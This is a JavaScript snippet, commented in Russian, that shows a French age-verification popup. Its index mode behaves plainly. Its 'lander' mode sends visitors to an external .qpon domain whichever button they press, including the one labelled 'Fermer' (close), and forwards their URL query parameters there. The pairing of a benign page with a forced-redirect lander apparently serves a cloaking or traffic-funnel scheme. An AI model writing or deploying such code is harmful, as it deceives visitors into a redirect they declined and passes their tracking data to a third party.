(function () {
      // Базовая ссылка БЕЗ параметров
      const BASE_REDIRECT = "https://meilleuresappsfr.qpon/";
     
      // Функция, которая берет параметры из текущего URL и добавляет их к базовой ссылке
      function getFullRedirectUrl() {
        // window.location.search — это строка со всеми текущими параметрами (например, "?a=1&b=2")
        const currentParams = window.location.search; 
        
        if (!currentParams) {
          return BASE_REDIRECT; // Если параметров нет, отдаем чистую ссылку
        }
    
        // Создаем объект URL, чтобы корректно склеить параметры и не сломать ссылку
        const url = new URL(BASE_REDIRECT);
        
        // Объединяем дефолтные параметры ссылки (если они там когда-то появятся) с текущими
        const combinedParams = new URLSearchParams(url.search + currentParams);
        url.search = combinedParams.toString();
        
        return url.toString();
      }
     
      function getOrBuildPopup() {
        let bd = document.querySelector(".modal-backdrop");
        
        if (!bd) {
          bd = document.createElement("div");
          bd.className = "modal-backdrop";
          bd.innerHTML = `
          <div class="modal" role="dialog" aria-modal="true" aria-label="Policy Notice">
          <h3>Bienvenue </h3>
          <p>Êtes-vous majeur(e) ?</p>
          <div class="modal-actions">
            <button class="btn" id="age-yes">Oui, accepter</button>
            <button class="btn ghost" id="age-no">Fermer</button>
          </div>
        </div>`;
          document.body.appendChild(bd);
        }
        
        bd.style.display = "flex";
     
        function close() {
          bd.classList.add("fade-out");
          setTimeout(() => bd.remove(), 180);
        }
     
        return { bd, close };
      }
     
      window.PopupIndex = function () {
        const target = getOrBuildPopup();
        if (!target) return;
        const { bd, close } = target;
     
        bd.querySelector("#age-yes").addEventListener("click", close);
        bd.querySelector("#age-no").addEventListener("click", () => {
          // Для index.html тоже можно прокинуть параметры на страницу privacy.html, если нужно:
          window.location.href = "privacy.html" + window.location.search;
        });
      };
     
      window.PopupLander = function () {
        const target = getOrBuildPopup();
        if (!target) return;
        const { bd } = target;
     
        // Вешаем обработчики, которые генерируют ссылку с параметрами прямо в момент клика
        bd.querySelector("#age-yes").addEventListener("click", () => {
          window.location.href = getFullRedirectUrl();
        });
        bd.querySelector("#age-no").addEventListener("click", () => {
          window.location.href = getFullRedirectUrl();
        });
      };
    })();